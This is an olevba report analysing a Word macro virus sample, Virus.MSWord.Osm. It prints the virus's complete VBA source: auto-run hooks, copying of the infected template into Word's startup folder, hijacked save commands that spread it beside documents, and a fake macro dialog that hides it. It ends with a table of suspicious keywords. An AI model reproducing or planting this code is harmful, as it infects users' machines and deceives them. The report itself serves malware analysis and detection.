olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function FCopy Lib "kernel32" Alias "CopyFileA" (ByVal src As String, ByVal dest As String, ByVal FailExist As Boolean) As Boolean
Sub AutoExec()
    On Error GoTo p0p
    If FileLen(Application.StartupPath + "\Startup.dot") < 10 Then MsgBox ("1")
    Exit Sub
    
p0p:
    Insert
End Sub

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 03/11/98 by ITSC"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.AutoOpen"
    On Error GoTo p0p
    If FileLen(Application.StartupPath + "\Startup.dot") < 10 Then MsgBox ("1")
    Exit Sub
    
p0p:
    Insert
    EntryPoint
End Sub
Sub AutoClose()
    Application.NormalTemplate.Saved = True
End Sub

Sub Insert()
    On Error Resume Next
    Application.ScreenUpdating = False
    
    Dim src, dest As String
    dest = Application.StartupPath + "\Startup.dot"
    src = ActiveDocument.AttachedTemplate.FullName
       
    FCopy src, dest, False
    
    Application.ScreenUpdating = True

End Sub

Sub Copy()
    On Error Resume Next
    Dim src, dest As String
    dest = ActiveDocument.Path + "\Default.dot"
    src = Application.StartupPath + "\Startup.dot"
    
    Application.ScreenUpdating = False
    FCopy src, dest, False
        
    ActiveDocument.AttachedTemplate = dest
    ActiveDocument.Save
    
    Application.ScreenUpdating = True
End Sub
Sub FileSave()

    ActiveDocument.Save
    Copy
End Sub
Sub FileSaveAs()

    Dialogs(wdDialogFileSaveAs).Show
    Copy
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Load dlgMyMacs
    
    dlgMyMacs.cmbIn.Clear
    dlgMyMacs.TextBox1.Text = ""
    dlgMyMacs.cmbIn.AddItem "All active templates and documents"
    dlgMyMacs.cmbIn.SelText = "All active templates and documents"
    dlgMyMacs.cmbIn.AddItem "Normal (global template)"
    dlgMyMacs.cmbIn.AddItem "Word commands"
    dlgMyMacs.cmbIn.AddItem ActiveDocument.Name + " (document)"
    
    dlgMyMacs.Show

End Sub

Sub ToolsRecordMacroToggle()
Attribute ToolsRecordMacroToggle.VB_Description = "Turns macro recording on or off"
Attribute ToolsRecordMacroToggle.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.ToolsRecordMacroToggle"
    MsgBox "You do not have permission to create macros on this computer.", vbOKOnly, "Microsoft Word"
End Sub

Sub EntryPoint()
    ThisDocument.Shapes(1).Activate
    ThisDocument.Saved = True
End Sub

Sub Show()
    ThisDocument.Shapes(1).Visible = msoTrue
End Sub

Sub Hide()
    ThisDocument.Shapes(1).Visible = msoFalse
End Sub
-------------------------------------------------------------------------------
VBA MACRO dlgMyMacs.frm 
in file: Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696 - OLE stream: 'Macros/VBA/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton3_Click()
    dlgMyMacs.Hide
End Sub

Private Sub CommandButton4_Click()
    dlgMyMacs.Hide
End Sub

Private Sub CommandButton6_Click()
    MsgBox "You do not have permission to create macros on this computer.", vbOKOnly, "Microsoft Word"
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macro name:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros in:o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Step IntouK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Edit�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Delete@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OrganizeruK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmbIn'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton8'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Osm-73beb9d3750dfb9326c6c1f46e97a7839b453696' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton3_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

